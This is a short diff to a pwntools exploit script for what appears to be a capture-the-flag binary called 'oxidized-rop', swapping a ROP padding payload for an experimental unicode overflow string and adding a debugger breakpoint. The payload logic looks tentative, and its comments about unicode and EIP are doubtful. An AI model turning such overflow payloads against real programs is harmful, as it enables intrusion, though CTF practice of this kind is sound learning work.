@@ -11,6 +11,7 @@ elf = ELF("./oxidized-rop")
 #p = remote("ip", 4444)
 #p = process("./oxidized-rop")
 p = gdb.debug("./oxidized-rop",'''
+b *_ZN12oxidized_rop4main17h3b2fbbcaac189096E
 b *_ZN12oxidized_rop4main17h3b2fbbcaac189096E+236''')
 
 # Stack Canary Leak Setup
@@ -20,12 +21,17 @@ p.recvline()
 #ROP
 pop_rdi = p64(0x0000000000007f75)
 
-# Exploit
-padA = b'A' * 122
-padB = pop_rdi
-padC = b'C' * (200-122-8)
+# unicode standard is different
+# use correct unicode to EIP & variable address correctly
+unicode_C = '\u0056'
+unicode_B = '\u1234'
 
-exploit = padA + padB + padC
+
+# Exploit
+padA = 'A' * 122
+padB = 'B' * 8
+
+exploit = padA + unicode_C + unicode_B
 p.recvline()
 p.sendline(exploit)
 
